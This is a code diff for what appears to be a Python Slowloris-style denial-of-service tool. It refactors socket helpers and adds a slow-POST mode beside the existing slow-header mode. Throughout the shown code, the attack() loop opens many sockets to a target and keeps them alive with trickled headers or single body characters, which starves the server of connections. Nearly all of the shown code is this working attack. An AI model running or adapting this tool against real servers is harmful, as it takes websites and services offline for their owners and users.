@@ -2,10 +2,11 @@ import logging
 import random
 import socket
 import time
+import string
 import ssl
 from enum import Enum
 from args_parser import get_args
-from my_socket import MySocket
+from socket_utils import send_line, send_header, send_utf8
 from constants import user_agents
 
 
@@ -25,7 +26,7 @@ def init_socket(mode, host, port, https, randuseragent):
     :param randuseragent: boolean, 是否使用随机 User-Agent
     :return:
     """
-    s = MySocket(socket.AF_INET, socket.SOCK_STREAM)
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(4)
 
     if https:
@@ -33,15 +34,22 @@ def init_socket(mode, host, port, https, randuseragent):
 
     s.connect((host, port))
 
-    if mode == Mode.HEADER:
-        s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")
-
     ua = user_agents[0]
     if randuseragent:
         ua = random.choice(user_agents)
 
-    s.send_header("User-Agent", ua)
-    s.send_header("Accept-language", "en-US,en,q=0.5")
+    if mode == Mode.HEADER:
+        send_line(s, f"GET /?{random.randint(0, 2000)} HTTP/1.1")
+        send_header(s, "Host", host)
+        send_header(s, "User-Agent", ua)
+        send_header(s, "Accept-language", "en-US,en,q=0.5")
+    elif mode == Mode.POST:
+        send_line(s, f"POST /?{random.randint(0, 2000)} HTTP/1.1")
+        send_header(s, "Host", host)
+        send_header(s, "User-Agent", ua)
+        send_header(s, "Accept-language", "en-US,en,q=0.5")
+        send_header(s, "Content-Length", random.randint(1000, 5000))
+        send_line(s)
     return s
 
 
@@ -74,20 +82,26 @@ def attack(mode, host, port, sockets, sleeptime, https, randuseragent):
 
     while True:
         try:
+            # Send a beat
             logging.info(
-                "Sending keep-alive headers... Socket count: %s",
+                "Sending a beat... Socket count: %s",
                 len(list_of_sockets),
             )
             for s in list(list_of_sockets):
                 try:
-                    s.send_header("X-a", random.randint(1, 5000))
+                    if mode == Mode.HEADER:
+                        send_header(s, "X-a", random.randint(1, 5000))
+                    elif mode == Mode.POST:
+                        send_utf8(s, random.choice(string.ascii_lowercase))
                 except socket.error:
                     list_of_sockets.remove(s)
 
-            logging.debug("Recreating socket...")
+            # Recreate sockets
+            logging.debug("Recreating sockets...")
             for _ in range(socket_count - len(list_of_sockets)):
                 try:
                     s = init_socket(mode, ip, port, https, randuseragent)
+                    logging.debug("Recreating socket")
                     if s:
                         list_of_sockets.append(s)
                 except socket.error as e:
